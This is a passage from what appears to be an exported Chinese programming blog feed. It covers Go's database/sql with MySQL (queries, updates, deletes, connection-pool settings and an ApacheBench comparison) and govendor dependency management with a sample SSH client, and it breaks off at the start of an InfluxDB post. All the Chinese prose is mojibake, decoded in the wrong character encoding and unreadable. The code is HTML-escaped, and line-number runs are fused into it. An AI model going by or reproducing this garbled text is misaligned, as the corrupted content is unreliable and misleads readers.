RowÂåÖÂê´Â≠óÊÆµÂíåÂÄºÔºåÈÄöËøárows.Columns()Ëé∑ÂèñÂ≠óÊÆµÔºåÈÄöËøárows.Next()Ëé∑ÂèñÂÄºÔºåËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèNext()Ëøô‰∏™ÊñπÊ≥ïÔºåÂÆÉÂíåpythonÈáåÈù¢ÁöÑÁîüÊàêÂô®Ê¶ÇË¶ÅÂæàÂÉèÔºåNextËøîÂõû‰∏Ä‰∏™boolÂÄºÔºåË°®Á§∫ÊòØÂê¶ÊúâÊñ∞ÁöÑrowÊï∞ÊçÆÂáÜÂ§áÂ•Ω‰∫ÜÔºåÂ¶ÇÊûúÂáÜÂ§áÂ•Ω‰∫ÜÔºå‰ΩøÁî®rows.Scan()Êù•Ëé∑ÂèñÂáÜÂ§áÂ•ΩÁöÑÊï∞ÊçÆ1234567891011121314151617181920212223func query() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) for rows.Next() &#123; var userId int var userName string var userAge int var userSex int rows.Columns() err = rows.Scan(&amp;userId, &amp;userName, &amp;userAge, &amp;userSex) checkErr(err) fmt.Println(userId) fmt.Println(userName) fmt.Println(userAge) fmt.Println(userSex) &#125;&#125; ËøôÊ†∑Êâ´ÊèèÊàë‰ª¨ÁöÑÁ°ÆËÉΩËé∑ÂèñÂà∞Êï∞ÊçÆÔºå‰ΩÜÊòØÊï∞ÊçÆÂπ∂Ê≤°ÊúâË¢´ÂèãÂ•ΩÁöÑÁªÑÁªáËµ∑Êù•ÔºåÂú®pythonÁöÑmysqlÈ©±Âä®‰∏≠Êèê‰æõ‰∏Ä‰∏™ÁÆÄÂçïÊñπÊ≥ïÂèØ‰ª•Â∞ÜËøô‰∫õË°åÊï∞ÊçÆÁªÑÁªáÊàê‰∏Ä‰∏™dictËøîÂõûÔºåÂõ†Ê≠§Âú®golang‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜrowsÁöÑÊï∞ÊçÆÁªÑÁªáÊàê‰∏Ä‰∏™mapËøîÂõûÔºåÊñπ‰æø‰ΩøÁî®„ÄÇ12345678910111213141516171819202122232425262728func queryToMap() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) rows, err := db.Query("SELECT * FROM user") checkErr(err) //Â≠óÂÖ∏Á±ªÂûã //ÊûÑÈÄ†scanArgs„ÄÅvalues‰∏§‰∏™Êï∞ÁªÑÔºåscanArgsÁöÑÊØè‰∏™ÂÄºÊåáÂêëvaluesÁõ∏Â∫îÂÄºÁöÑÂú∞ÂùÄ columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //Â∞ÜË°åÊï∞ÊçÆ‰øùÂ≠òÂà∞recordÂ≠óÂÖ∏ err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; fmt.Println(record) &#125;&#125; Êé•‰∏ãÊù•ÊòØÊï∞ÊçÆÁöÑÊõ¥Êñ∞, Êõ¥Êñ∞ÂíåÊï∞ÊçÆÁöÑÊèíÂÖ•ÂéüÁêÜ‰∏ÄËá¥ÔºåÂè™ÊòØÂú®ÂáÜÂ§áÁöÑSQLÈáåÈù¢ÈÄöËøáWHEREÊåáÂÆöÊù°‰ª∂Ôºå‰ª•Êõ¥Êñ∞ÊåáÂÆöÁöÑÊï∞ÊçÆËÆ∞ÂΩï„ÄÇ123456789101112func update() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`UPDATE user SET user_age=?,user_sex=? WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(21, 2, 1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; ÊúÄÂêéÊòØÊï∞ÊçÆÁöÑÂà†Èô§ÔºåÂêåÁêÜ123456789101112func remove() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) stmt, err := db.Prepare(`DELETE FROM user WHERE user_id=?`) checkErr(err) res, err := stmt.Exec(1) checkErr(err) num, err := res.RowsAffected() checkErr(err) fmt.Println(num)&#125; Â¶Ç‰ΩïËÆæÁΩÆËøûÊé•Ê±†Êï∞ÊçÆÂ∫ìÊ†áÂáÜÊé•Âè£ÈáåÈù¢Êúâ3‰∏™ÊñπÊ≥ïÁî®‰∫éËÆæÁΩÆËøûÊé•Ê±†ÁöÑÂ±ûÊÄß: SetConnMaxLifetime, SetMaxIdleConns, SetMaxOpenConns SetConnMaxLifetime: ËÆæÁΩÆ‰∏Ä‰∏™ËøûÊé•ÁöÑÊúÄÈïøÁîüÂëΩÂë®ÊúüÔºåÂõ†‰∏∫Êï∞ÊçÆÂ∫ìÊú¨Ë∫´ÂØπËøûÊé•Êúâ‰∏Ä‰∏™Ë∂ÖÊó∂Êó∂Èó¥ÁöÑËÆæÁΩÆÔºåÂ¶ÇÊûúË∂ÖÊó∂Êó∂Èó¥Âà∞‰∫ÜÊï∞ÊçÆÂ∫ì‰ºöÂçïÊñπÈù¢Êñ≠ÊéâËøûÊé•ÔºåÊ≠§Êó∂ÂÜçÁî®ËøûÊé•Ê±†ÂÜÖÁöÑËøûÊé•ËøõË°åËÆøÈóÆÂ∞±‰ºöÂá∫Èîô, Âõ†Ê≠§Ëøô‰∏™ÂÄºÂæÄÂæÄË¶ÅÂ∞è‰∫éÊï∞ÊçÆÂ∫ìÊú¨Ë∫´ÁöÑËøûÊé•Ë∂ÖÊó∂Êó∂Èó¥ SetMaxIdleConns: ËøûÊé•Ê±†ÈáåÈù¢ÂÖÅËÆ∏IdelÁöÑÊúÄÂ§ßËøûÊé•Êï∞, Ëøô‰∫õIdelÁöÑËøûÊé• Â∞±ÊòØÂπ∂ÂèëÊó∂ÂèØ‰ª•ÂêåÊó∂Ëé∑ÂèñÁöÑËøûÊé•,‰πüÊòØÁî®ÂÆåÂêéÊîæÂõûÊ±†ÈáåÈù¢ÁöÑ‰∫íÁî®ÁöÑËøûÊé•, ‰ªéËÄåÊèêÂçáÊÄßËÉΩ„ÄÇ SetMaxOpenConns: ËÆæÁΩÆÊúÄÂ§ßÊâìÂºÄÁöÑËøûÊé•Êï∞ÔºåÈªòËÆ§ÂÄº‰∏∫0Ë°®Á§∫‰∏çÈôêÂà∂„ÄÇÊéßÂà∂Â∫îÁî®‰∫éÊï∞ÊçÆÂ∫ìÂª∫Á´ãËøûÊé•ÁöÑÊï∞ÈáèÔºåÈÅøÂÖçËøáÂ§öËøûÊé•ÂéãÂûÆÊï∞ÊçÆÂ∫ì„ÄÇ ‰ª£Á†Å‰∏ä‰ΩøÁî®Â∞±ÂæàÁÆÄÂçï‰∫Ü, ÂàùÂßãÂåñdbÊó∂ÔºåÊ†πÊçÆÈúÄÊ±ÇËÆæÁΩÆÂ•ΩËøûÊé•Ê±†„ÄÇ123456789var db *sql.DB func init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping()&#125; ÊÄßËÉΩÂØπÊØîËøûÊé•Ê±†ÂØπÊÄßËÉΩÁöÑÊèêÂçáËøòÊòØÂæàÊòéÊòæÁöÑ, ‰∏ãÈù¢Êàë‰ª¨Â∞±ÊµãËØïÂØπÊØî‰∏Ä‰∏ã ‰ΩøÁî®ËøûÊé•Ê±†Âíå‰∏ç‰ΩøÁî®ËøûÊé•Ê±†Êó∂ÁöÑÊÄßËÉΩÂ∑ÆÂà´„ÄÇÊµãËØï‰ª£Á†ÅÂ¶Ç‰∏ã(‰∏ç‰ΩøÁî®ËøûÊé•Ê±†Êó∂ Ê≥®ÈáäÊéâËøûÊé•Ê±†Áõ∏ÂÖ≥ËÆæÁΩÆ):123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package mainimport ( "database/sql" "fmt" "log" "net/http" "time" _ "github.com/go-sql-driver/mysql")var db *sql.DBfunc init() &#123; db, _ = sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") db.SetMaxOpenConns(2000) db.SetMaxIdleConns(1000) db.SetConnMaxLifetime(time.Minute * 60) db.Ping() createTable() insert()&#125;func main() &#123; startHttpServer()&#125;func createTable() &#123; db, err := sql.Open("mysql", "root:passwd@tcp(127.0.0.1:3306)/test?charset=utf8") checkErr(err) table := `CREATE TABLE IF NOT EXISTS test.user ( user_id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT 'Áî®Êà∑ÁºñÂè∑', user_name VARCHAR(45) NOT NULL COMMENT 'Áî®Êà∑ÂêçÁß∞', user_age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'Áî®Êà∑Âπ¥ÈæÑ', user_sex TINYINT(3) UNSIGNED NOT NULL DEFAULT 0 COMMENT 'Áî®Êà∑ÊÄßÂà´', PRIMARY KEY (user_id)) ENGINE = InnoDB AUTO_INCREMENT = 1 DEFAULT CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'Áî®Êà∑Ë°®'` if _, err := db.Exec(table); err != nil &#123; checkErr(err) &#125;&#125;func insert() &#123; stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) res, err := stmt.Exec("tony", 20, 1) checkErr(err) id, err := res.LastInsertId() checkErr(err) fmt.Println(id)&#125;func queryToMap() []map[string]string &#123; var records []map[string]string rows, err := db.Query("SELECT * FROM user") defer rows.Close() checkErr(err) //Â≠óÂÖ∏Á±ªÂûã //ÊûÑÈÄ†scanArgs„ÄÅvalues‰∏§‰∏™Êï∞ÁªÑÔºåscanArgsÁöÑÊØè‰∏™ÂÄºÊåáÂêëvaluesÁõ∏Â∫îÂÄºÁöÑÂú∞ÂùÄ columns, _ := rows.Columns() scanArgs := make([]interface&#123;&#125;, len(columns)) values := make([]interface&#123;&#125;, len(columns)) for i := range values &#123; scanArgs[i] = &amp;values[i] &#125; for rows.Next() &#123; //Â∞ÜË°åÊï∞ÊçÆ‰øùÂ≠òÂà∞recordÂ≠óÂÖ∏ err = rows.Scan(scanArgs...) record := make(map[string]string) for i, col := range values &#123; if col != nil &#123; record[columns[i]] = string(col.([]byte)) &#125; &#125; records = append(records, record) &#125; return records&#125;func startHttpServer() &#123; http.HandleFunc("/pool", pool) err := http.ListenAndServe(":9090", nil) if err != nil &#123; log.Fatal("ListenAndServe: ", err) &#125;&#125;func pool(w http.ResponseWriter, r *http.Request) &#123; records := queryToMap() fmt.Println(records) fmt.Fprintln(w, "finish")&#125;func checkErr(err error) &#123; if err != nil &#123; fmt.Println(err) panic(err) &#125;&#125; Â∏¶ËøûÊé•Ê±†ÁöÑÊµãËØïÁªìÊûú:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455‚ûú ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 0.832 secondsComplete requests: 1000Failed requests: 928 (Connect: 0, Receive: 0, Length: 928, Exceptions: 0)Total transferred: 114144 bytesHTML transferred: 6496 bytesRequests per second: 1201.65 [#/sec] (mean)Time per request: 83.219 [ms] (mean)Time per request: 0.832 [ms] (mean, across all concurrent requests)Transfer rate: 133.95 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 4 4.6 2 18Processing: 8 79 107.2 47 489Waiting: 0 71 107.9 40 488Total: 12 82 106.4 49 491Percentage of the requests served within a certain time (ms) 50% 49 66% 59 75% 67 80% 80 90% 159 95% 394 98% 450 99% 479 100% 491 (longest request) ÂéªÈô§ËøûÊé•Ê±†ÁöÑËÆæÁΩÆÂêéÁöÑÊµãËØïÁªìÊûú:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455‚ûú ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 1.467 secondsComplete requests: 1000Failed requests: 938 (Connect: 0, Receive: 0, Length: 938, Exceptions: 0)Total transferred: 115374 bytesHTML transferred: 6566 bytesRequests per second: 681.83 [#/sec] (mean)Time per request: 146.664 [ms] (mean)Time per request: 1.467 [ms] (mean, across all concurrent requests)Transfer rate: 76.82 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 1 1.7 1 19Processing: 8 139 106.8 109 415Waiting: 0 133 110.7 81 415Total: 10 141 107.4 110 418Percentage of the requests served within a certain time (ms) 50% 110 66% 210 75% 237 80% 250 90% 285 95% 321 98% 378 99% 393 100% 418 (longest request) ÁªìËÆ∫ ÂêåÊ†∑ÁöÑÂπ∂ÂèëÊÉÖÂÜµ‰∏ã, ‰ΩøÁî®ËøûÊé•Ê±†ÊØîÊ≤°‰ΩøÁî®Âø´‰∏ÄÂÄç, Âú®È´òÂπ∂ÂèëÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ∫îËØ•Êõ¥ÊòéÊòæ„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>go-sql-drive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangÂåÖÁÆ°ÁêÜ‰πãvendor]]></title>
    <url>%2F2017%2F03%2F13%2Fgolang-pkg-management-tool%2F</url>
    <content type="text"><![CDATA[Âú®‰ΩøÁî®GolangËøáÁ®ã‰∏≠ÔºåÊúâ‰∏Ä‰∏™ÈùûÂ∏∏‰ª§‰∫∫Â§¥Â§ßÁöÑÈóÆÈ¢ò: Áº∫Â∞ë‰æùËµñÂ∫ìÁâàÊú¨ÂäüËÉΩÁÆ°ÁêÜ, ÊØîÂ¶ÇÊüê‰∫õ‰æùËµñÂú®Êüê‰∏™commit‰πãÂêéÂèëÁîü‰∫ÜAPIÂèòÊõ¥‰πãÂêéÔºåÂ¶ÇÊûú‰∏ç‰øÆÊîπ‰ª£Á†ÅÂæàÈöæÂÖºÂÆπÔºåÁÑ∂ËÄåÂºÄÂèëËÄÖ‰πãÈó¥ÂæàÊúâÂèØËÉΩÂõ†‰∏∫ÂèÇ‰∏éÁöÑÊó∂Èó¥‰∏çÂêåÔºåÂØºËá¥ÊâßË°ågo getÂëΩ‰ª§Ëé∑ÂèñÁöÑÁâàÊú¨‰∏çÂêåÔºåËÄåÂØºËá¥ÂêÑÁßçÈóÆÈ¢ò, ÁîöËá≥ÊòØÁºñËØë‰∏çÈÄöËøá„ÄÇÂõ†Ê≠§ÈúÄË¶ÅÊúâ‰∏Ä‰∏™ÂåÖ‰æùËµñÁöÑÁâàÊú¨ÊéßÂà∂Â∑•ÂÖ∑„ÄÇ vendor‰πãÂâçÂú®vendorÂá∫Êù•‰πãÂâç, ‰ª•godep‰∏∫‰∏ªÊØîËæÉÊµÅË°å, godepÁöÑÂéüÁêÜÈùûÂ∏∏ÁÆÄÂçï:godepÊääÁ¨¨‰∏âÂåÖÁöÑÁâàÊú¨‰æùËµñ‰ø°ÊÅØËÆ∞ÂΩïÂú®Godeps.json‰∏ãÔºåÂπ∂‰∏îÊääÁ¨¨‰∏âÂåÖÂÆåÊï¥Êã∑Ë¥ù‰∏Ä‰ªΩÂà∞vendor‰∏ãÈù¢„ÄÇÈÄöËøáÂØπGodeps.jsonÊñá‰ª∂ËøõË°åÁâàÊú¨ÁÆ°ÁêÜÂç≥ÂèØ‰ª•ÁÆ°ÁêÜÊï¥‰∏™È°πÁõÆÁöÑÁ¨¨‰∏âÊñπÂåÖ‰æùËµñ‰ø°ÊÅØ„ÄÇ ÂèØ‰ª•ÁúãÂà∞godepÂè™ÊòØÊääÁ¨¨‰∏âÊñπÂåÖËøõË°åÂçïÁã¨Âà∞‰æùËµñÁÆ°ÁêÜÔºåËÄåÊñ∞Â¢ûÂà∞Á¨¨‰∏âÂåÖËøòÊòØ‰ºöË¢´getÂà∞GOPATH‰∏≠, Â¶ÇÊûúÂ§ö‰∏™È°πÁõÆÁî®Âêå‰∏Ä‰∏™Á¨¨‰∏âÂåÖÁöÑ‰∏çÂêåÁâàÊú¨Êó∂, ÈÇ£Â∞±ÂÆåËõã‰∫Ü vendorÁöÑÂéÜÂè≤vendorÊú∫Âà∂Â∞±ÊòØÁî®Êù•Ëß£ÂÜ≥Á¨¨‰∏âÊñπÂåÖ‰æùËµñÈóÆÈ¢ò: golang 1.5ÂºïÂÖ•, ÈªòËÆ§ÊòØÂÖ≥Èó≠ÁöÑ, ÈÄöËøáÊâãÂä®ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáè:GO15VENDOREXPERIMENT=1ÂºÄÂêØ golang 1.6ÈªòËÆ§ÂºÄÂêØ goalng 1.7 vendor‰Ωú‰∏∫ÂäüËÉΩÊîØÊåÅ,ÂèñÊ∂àGO15VENDOREXPERIMENTÁéØÂ¢ÉÂèòÈáè vendorÁöÑÂéüÁêÜÂæàÁÆÄÂçï: Â∞ÜÁ¨¨‰∏âÊñπ‰æùËµñÊîæÂÖ•ÂΩìÂâçÈ°πÁõÆvendorÁõÆÂΩï‰∏≠Ôºå ÁºñËØëÁöÑÊó∂ÂÄô‰ªévendorÁõÆÂΩï‰∏≠Êü•Êâæ‰æùËµñËÄå‰∏ç‰ªéGOPATH/src‰∏≠ÂØπÂ∫îÁõÆÂΩï‰∏≠Êü•Êâæ„ÄÇÊñ∞Â¢ûÁöÑÁ¨¨‰∏âÊñπÂåÖÁõ¥Êé•Ë¢´getÂà∞Ê†πÁõÆÂΩïÁöÑvendorÊñá‰ª∂Â§π‰∏ã,‰∏ç‰ºö‰∏éÂÖ∂ÂÆÉÁöÑÈ°πÁõÆÊ∑∑Áî®Á¨¨‰∏âÊñπÂåÖÔºåÂÆåÁæéÈÅøÂÖçÂ§ö‰∏™È°πÁõÆÂêåÁî®Âêå‰∏Ä‰∏™Á¨¨‰∏âÊñπÂåÖÁöÑ‰∏çÂêåÁâàÊú¨ÈóÆÈ¢ò„ÄÇÂõ†Ê≠§Âè™ÈúÄË¶ÅÂØπvendor/vendor.jsonËøõË°åÁâàÊú¨ÊéßÂà∂ÔºåÂç≥ÂèØÂØπÁ¨¨‰∏âÂåÖ‰æùËµñÂÖ≥Á≥ªËøõË°åÊéßÂà∂„ÄÇ vendorÁöÑ‰ΩøÁî®ÊÉ≥Ë¶ÅËØ¶ÁªÜ‰∫ÜËß£govendorËØ∑ÂèÇËÄÉgovendor ÂÆâË£Ögovendor 1go get -u -v github.com/kardianos/govendor ÂàõÂª∫‰∏Ä‰∏™golangÁöÑÈ°πÁõÆ ÊØîÂ¶ÇÊàëÂàõÂª∫‰∏Ä‰∏™ÁÆÄÂçïÁöÑ‰æùËµñsshÊúçÂä°ÁöÑÂåÖ1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String()) ÂàùÂßãÂåñvendorÊñá‰ª∂ 12345678910111213‚ûú govendor_test govendor init‚ûú govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;‚ûú govendor_test tree ..‚îú‚îÄ‚îÄ main.go‚îî‚îÄ‚îÄ vendor ‚îî‚îÄ‚îÄ vendor.json ÂàùÂßãÂåñÂÆåÊàêÂêé‰ºöÁîüÊàê‰∏Ä‰∏™vendorÁöÑÊñá‰ª∂Â§π, Âõ†‰∏∫ÊàëËøòÊ≤°Ê∑ªÂä†‰æùËµñ, ÊâÄ‰ª•vendor.jsonÈáåÈù¢Âπ∂Ê≤°ÊúâÁõ∏ÂÖ≥‰æùËµñÂåÖÁöÑÊèèËø∞ Ê∑ªÂä†‰æùËµñÁöÑÁ¨¨‰∏âÊñπÂåÖ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182‚ûú govendor_test govendor add +external‚ûú govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [ &#123; &quot;checksumSHA1&quot;: &quot;C1KKOxFoW7/W/NFNpiXK+boguNo=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/curve25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;wGb//LjBPNxYHqk+dcLo7BjPXK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;LXFcVx8I587SnWmKycSDEq9yvK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519/internal/edwards25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;fsrFs762jlaILyqqQImS1GfvIvw=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ssh&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125; ], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;‚ûú govendor_test tree ..‚îú‚îÄ‚îÄ main.go‚îî‚îÄ‚îÄ vendor ‚îú‚îÄ‚îÄ golang.org ‚îÇ ‚îî‚îÄ‚îÄ x ‚îÇ ‚îî‚îÄ‚îÄ crypto ‚îÇ ‚îú‚îÄ‚îÄ LICENSE ‚îÇ ‚îú‚îÄ‚îÄ PATENTS ‚îÇ ‚îú‚îÄ‚îÄ curve25519 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ const_amd64.h ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ const_amd64.s ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ cswap_amd64.s ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ curve25519.go ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ doc.go ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ freeze_amd64.s ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ ladderstep_amd64.s ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ mont25519_amd64.go ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ mul_amd64.s ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ square_amd64.s ‚îÇ ‚îú‚îÄ‚îÄ ed25519 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ ed25519.go ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ internal ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ edwards25519 ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ const.go ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ edwards25519.go ‚îÇ ‚îî‚îÄ‚îÄ ssh ‚îÇ ‚îú‚îÄ‚îÄ buffer.go ‚îÇ ‚îú‚îÄ‚îÄ certs.go ‚îÇ ‚îú‚îÄ‚îÄ channel.go ‚îÇ ‚îú‚îÄ‚îÄ cipher.go ‚îÇ ‚îú‚îÄ‚îÄ client.go ‚îÇ ‚îú‚îÄ‚îÄ client_auth.go ‚îÇ ‚îú‚îÄ‚îÄ common.go ‚îÇ ‚îú‚îÄ‚îÄ connection.go ‚îÇ ‚îú‚îÄ‚îÄ doc.go ‚îÇ ‚îú‚îÄ‚îÄ handshake.go ‚îÇ ‚îú‚îÄ‚îÄ kex.go ‚îÇ ‚îú‚îÄ‚îÄ keys.go ‚îÇ ‚îú‚îÄ‚îÄ mac.go ‚îÇ ‚îú‚îÄ‚îÄ messages.go ‚îÇ ‚îú‚îÄ‚îÄ mux.go ‚îÇ ‚îú‚îÄ‚îÄ server.go ‚îÇ ‚îú‚îÄ‚îÄ session.go ‚îÇ ‚îú‚îÄ‚îÄ tcpip.go ‚îÇ ‚îî‚îÄ‚îÄ transport.go ‚îî‚îÄ‚îÄ vendor.json9 directories, 36 files Êàë‰ª¨ÂèëÁé∞vendor.jsonÁöÑpackageÂ∑≤ÁªèËÆ∞ÂΩï‰∫ÜÁ¨¨‰∏âÊñπÂåÖÁöÑÁâàÊú¨,Âπ∂‰∏îÊääËøô‰∫õ‰æùËµñÁöÑÂåÖÈÉΩÊîæÂà∞vendorÁõÆÂΩï‰∏ã‰∫Ü Ê†πÊçÆËá™Â∑±ÁöÑÈúÄÊ±Ç,ÈÄâÊã©ÊòØÂê¶Â∞ÜvendorÁõÆÂΩïÂÅöÁâàÊú¨ÊéßÂà∂ ‰∏ÄËà¨Âè™ÈúÄË¶ÅÂ∞Üvendor.jsonÂÅöÁâàÊú¨ÊéßÂà∂Âç≥ÂèØ,‰ΩÜÊòØÂØπ‰∫éÈÇ£‰∫õÈúÄË¶ÅÁøªÂ¢ôÊâçËÉΩ‰∏ãËΩΩÁöÑÂåÖ‰πüÂèØ‰ª•Áõ¥Êé•Â∞ÜvendorÈÉΩÁ∫≥ÂÖ•ÁâàÊú¨ÊéßÂà∂Ê∑ªÂä†.ignore.git‰ªÖÂØπvendor.jsonÂÅöÁâàÊú¨ÊéßÂà∂123456git initecho &quot;vendor/golang.or&quot; .gitignoregit add .git commit -m &quot;test commit&quot;git push -u origin master... ÂÖ∂‰ªñÂ∞è‰ºô‰º¥ÂÆâË£Ö‰æùËµñ ÂÖ∂‰ªñÂ∞è‰ºô‰º¥Â¶ÇÊûúÈúÄË¶Å‰ΩøÁî®Ëøô‰∏™È°πÁõÆ, Êãâ‰∏ãËØ•È°πÁõÆ12git clone ssh://git@xxx/govendor_test.githttps_proxy=http://localhost:8123 govendor sync (ÊàëÈúÄË¶ÅÂÆâË£Ögolang.orgÁöÑÂåÖ,Âõ†Ê≠§ÈúÄË¶ÅFQ) ËøôÊ†∑Â∞±ÂÆâË£Ö‰∫ÜËØ•È°πÁõÆÁöÑÊåáÂÆöÁâàÊú¨ÁöÑÁ¨¨‰∏â‰∏™‰æùËµñ„ÄÇÊé•‰∏ãÊù•ÊÑâÂø´ÁöÑÁé©ËÄçÂêß!]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>vendor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Êó∂Â∫èÊï∞ÊçÆÂ∫ì‰πãInfluxDB]]></title>
    <url>%2F2017%2F03%2F10%2Fopentsdb-vs-influxdb%2F</url>
